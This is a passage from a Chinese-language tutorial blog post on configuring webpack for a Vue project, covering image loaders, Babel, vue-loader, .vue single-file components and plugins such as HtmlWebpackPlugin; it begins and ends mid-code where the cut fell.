</code></p><p>再次打包，就会发现dist文件夹下多了一个图片文件，并以32位哈希值命名。</p><p>但是，真实开发中，我们可能对打包的图片名字有一定的要求。比如：将所有的图片放在一个文件夹中，跟上图片原来的名称，同时也要防止重复。</p><p>所以，我们可以在options中添加上如下选项：</p><ul><li>img：文件要打包到的文件夹</li><li>name：获取图片原来的名字，放在该位置</li><li>hash:8：为了防止图片名称冲突，依然使用hash，但是我们只保留8位</li><li>ext：使用图片原来的扩展名</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">       <span class="attr">test</span>: <span class="regexp">/\.(png|jpg|gif|jpeg)$/</span>,</span><br><span class="line">       <span class="attr">use</span>: [</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">loader</span>: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">           <span class="attr">options</span>: &#123;</span><br><span class="line">             <span class="attr">limit</span>: <span class="number">8192</span>,</span><br><span class="line">             <span class="attr">name</span>: <span class="string">&#x27;img/[name].[hash:8].[ext]&#x27;</span></span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br></pre></td></tr></table></figure><p>但是我们发现图片并没有显示出来，这是因为图片使用的路径不正确：</p><p>默认情况下，webpack会将生成的路径直接返回给使用者</p><p>但是，我们整个程序是打包在dist文件夹下的，所以这里我们需要在路径下再添加一个dist&#x2F;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">publicPath</span>: <span class="string">&#x27;dist/&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ES6语法处理"><a href="#ES6语法处理" class="headerlink" title="ES6语法处理"></a>ES6语法处理</h2><p>如果你仔细阅读webpack打包的js文件，发现写的ES6语法并没有转成ES5，那么就意味着可能一些对ES6还不支持的浏览器没有办法很好的运行我们的代码。</p><p>如果希望将ES6的语法转成ES5，那么在webpack中，我们直接使用babel对应的loader就可以了。</p><p><code>cnpm install --save-dev babel-loader@7 babel-core babel-preset-es2015</code></p><p>配置webpack.config.js文件:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">  <span class="attr">exclude</span>: <span class="regexp">/(node_modules|bower_components)/</span>,</span><br><span class="line">  <span class="attr">use</span>: &#123;</span><br><span class="line">    <span class="attr">loader</span>: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">    <span class="attr">options</span>: &#123;</span><br><span class="line">      <span class="attr">presets</span>: [<span class="string">&#x27;es2015&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新打包，查看bundle.js文件，发现其中的内容变成了ES5的语法。</p><h1 id="webpack配置Vue"><a href="#webpack配置Vue" class="headerlink" title="webpack配置Vue"></a>webpack配置Vue</h1><h2 id="引入Vue"><a href="#引入Vue" class="headerlink" title="引入Vue"></a>引入Vue</h2><p>我们希望在项目中使用Vuejs，那么必然需要对其有依赖，所以需要先进行安装：<code>cnpm install vue --save</code></p><p>注意：因为我们后续是在实际项目中也会使用vue的，所以并不是开发时依赖。</p><p>按照我们之前学习的方式来开始使用Vue了：</p><p>main.js文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.使用commonjs的模块化规范</span></span><br><span class="line"><span class="keyword">const</span> &#123;add, mul&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./js/mathUtils.js&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">mul</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.使用ES6的模块化的规范</span></span><br><span class="line"><span class="keyword">import</span> &#123;name, age, height&#125; <span class="keyword">from</span> <span class="string">&quot;./js/info&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(height)</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;./css/normal.css&quot;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;./css/special.less&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="comment">// import cpn from &quot;./vue/cpn&quot;</span></span><br><span class="line"><span class="keyword">import</span> cpn <span class="keyword">from</span> <span class="string">&quot;./vue/cpn.vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;come on&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>index.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;dist/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="运行出错"><a href="#运行出错" class="headerlink" title="运行出错"></a>运行出错</h2><p>修改完成后，重新打包没有出现错误，但是运行程序，没有出现想要的效果，而且浏览器中有报错：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201105114424.png"></p><p>这里是因为涉及到Vue的不同版本构建，runtime-only（不可以有任何template）和runtime-compiler的区别。</p><p>而<code>&lt;div id=&quot;app&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;</code>就是Vue实例的template模板，所以我们需添加alias配置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">publicPath</span>: <span class="string">&#x27;dist/&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="el和template区别"><a href="#el和template区别" class="headerlink" title="el和template区别"></a>el和template区别</h2><p>正常运行之后，我们来考虑另外一个问题：</p><ul><li>如果我们希望将data中的数据显示在界面中，就必须修改index.html</li><li>如果我们后面自定义了组件，也必须修改index.html来使用组件</li><li>但是html模板在之后的开发中，我并不希望手动的来频繁修改，是否可以做到呢？</li></ul><p>定义template属性：</p><ul><li>在前面的Vue实例中，我们定义了el属性，用于和index.html中的#app进行绑定，让Vue实例之后可以管理它其中的内容</li><li>这里，我们可以将div元素中的<code>&#123;&#123;message&#125;&#125;</code>内容删掉，只保留一个基本的id为div的元素</li><li>但是如果我依然希望在其中显示<code>&#123;&#123;message&#125;&#125;</code>的内容，我们可以再定义一个template属性，代码如下：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;&lt;div id=&quot;app&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;nan&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>重新打包运行程序，显示一样的结果和HTML代码结构。</p><p>那么，el和template模板的关系是什么呢？</p><ul><li>我们知道el用于指定Vue要管理的DOM，可以帮助解析其中的指令、事件监听等等。</li><li>而如果Vue实例中同时指定了template，那么template模板的内容会替换掉挂载的对应el的模板。</li><li>这样做之后我们就不需要在以后的开发中再次操作index.html，只需要在template中写入对应的标签即可。</li></ul><h2 id="Vue组件化开发引入"><a href="#Vue组件化开发引入" class="headerlink" title="Vue组件化开发引入"></a>Vue组件化开发引入</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cpn = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;button @click=&quot;btnClick&quot;&gt;按钮&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;&#123;&#123; name &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  `</span>,</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&quot;Hello Webpack&quot;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;nan&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;&lt;cpn/&gt;&#x27;</span>,</span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    cpn</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>也可以将组件抽取到一个js文件中，main.js再导入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;button @click=&quot;btnClick&quot;&gt;按钮&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;&#123;&#123; name &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  `</span>,</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&quot;Hello Webpack&quot;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;nan&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vue文件封装处理"><a href="#vue文件封装处理" class="headerlink" title=".vue文件封装处理"></a>.vue文件封装处理</h2><p>但是一个组件以一个js对象的形式进行组织和使用的时候是非常不方便的：</p><ul><li>编写template模块非常的麻烦</li><li>如果有样式的话，我们写在哪里比较合适呢？</li></ul><p>现在，我们以一种全新的方式来组织一个vue的组件，也就是用.vue文件封装处理。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">App</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&quot;./App&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">name</span>: <span class="string">&quot;cpn&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">components</span>: &#123;<span class="title class_">App</span>&#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">message</span>: <span class="string">&quot;Hello Webpack&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">name</span>: <span class="string">&quot;nan&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"> <span class="selector-class">.title</span>&#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">   <span class="attribute">color</span>: green;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"> &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>但是，这种特殊的文件以及特殊的格式不可以被正确的加载，必须有vue-loader以及vue-template-compiler帮助我们处理。<br>安装vue-loader和vue-template-compiler：</p><p><code>cnpm install vue-loader vue-template-compiler --save-dev</code></p><p>修改webpack.config.js的配置文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">       <span class="attr">test</span>: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">       <span class="attr">use</span>: [<span class="string">&#x27;vue-loader&#x27;</span>]</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><hr><p>main.js引入组件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cpn <span class="keyword">from</span> <span class="string">&quot;./vue/cpn.vue&quot;</span>;</span><br></pre></td></tr></table></figure><p>注意：需要加上后缀<code>.vue</code>，否则会报错。</p><p>如果要自动匹配文件，省略后缀的话可以在webpack.config.js添加如下配置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resolve</span>: &#123;</span><br><span class="line">  <span class="attr">extensions</span>: [<span class="string">&#x27;.js&#x27;</span>,<span class="string">&#x27;.css&#x27;</span>,<span class="string">&#x27;.vue&#x27;</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="plugin的使用"><a href="#plugin的使用" class="headerlink" title="plugin的使用"></a>plugin的使用</h1><h2 id="认识plugin"><a href="#认识plugin" class="headerlink" title="认识plugin"></a>认识plugin</h2><p>plugin是插件的意思，通常是用于对某个现有的架构进行扩展。</p><p>webpack中的插件，就是对webpack现有功能的各种扩展，比如打包优化，文件压缩等等。</p><p>loader和plugin区别：</p><ul><li>loader主要用于转换某些类型的模块，它是一个转换器。</li><li>plugin是插件，它是对webpack本身的扩展，是一个扩展器。</li></ul><p>plugin的使用过程：</p><ol><li>通过npm安装需要使用的plugins(某些webpack已经内置的插件不需要安装)</li><li>在webpack.config.js中的plugins中配置插件。</li></ol><h2 id="添加版权的plugin"><a href="#添加版权的plugin" class="headerlink" title="添加版权的plugin"></a>添加版权的plugin</h2><p>为打包的文件添加版权声明，该插件名字叫BannerPlugin，属于webpack自带的插件。</p><p>按照下面的方式来修改webpack.config.js的文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">      <span class="keyword">new</span> webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&quot;最终版权归阿楠所有&quot;</span>),</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新打包程序，查看bundle.js文件的头部，可以看到第一行有我们的注释，也就是版权说明。</p><h2 id="打包html的plugin"><a href="#打包html的plugin" class="headerlink" title="打包html的plugin"></a>打包html的plugin</h2><p>目前，我们的index.html文件是存放在项目的根目录下的。</p><p>我们知道，在真实发布项目时，发布的是dist文件夹中的内容，但是dist文件夹中如果没有index.html文件，那么打包的js等文件也就没有意义了。所以，我们需要将index.html文件打包到dist文件夹中，这个时候就可以使用HtmlWebpackPlugin插件。</p><p>HtmlWebpackPlugin插件可以为我们做这些事情：</p><ul><li>自动生成一个index.html文件(可以指定模板来生成)</li><li>将打包的js文件，自动通过script标签插入到body中</li></ul><p>安装HtmlWebpackPlugin插件：<code>cnpm install html-webpack-plugin@3.2.0 --save-dev</code></p><p>使用插件，修改webpack.config.js文件中plugins部分的内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">      <span class="keyword">new</span> webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&quot;最终版权归阿楠所有&quot;</span>),</span><br><span class="line">      <span class="keyword">new</span> <span class="title function_">htmlWebpackPlugin</span>(&#123;</span><br><span class="line">        <span class="attr">template</span>: <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line">      &#125;),</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的template表示根据什么模板来生成index.html，我们根据根目录下的index.html来生成。</p><p>另外，我们需要删除之前图片文件处理中在output中添加的publicPath属性，否则插入的script标签中的src可能会有问题。现在html在dist目录中，自然能用dist里面的image了。</p><h2 id="js压缩的plugin"><a href="#js压缩的plugin" class="headerlink" title="js压缩的plugin"></a>js压缩的plugin</h2><p>在项目发布之前，我们必然需要对js等文件进行压缩处理。这里，我们就对打包的js文件进行压缩。</p><p>我们使用一个第三方的插件uglifyjs-webpack-plugin，并且版本号指定1.1.1，和CLI2保持一致：<br><code>cnpm install uglifyjs-webpack-plugin@1.1.1 --save-dev</code></p><p>修改webpack.config.js文件，使用插件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> uglifyjsWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">      <span class="keyword">new</span> 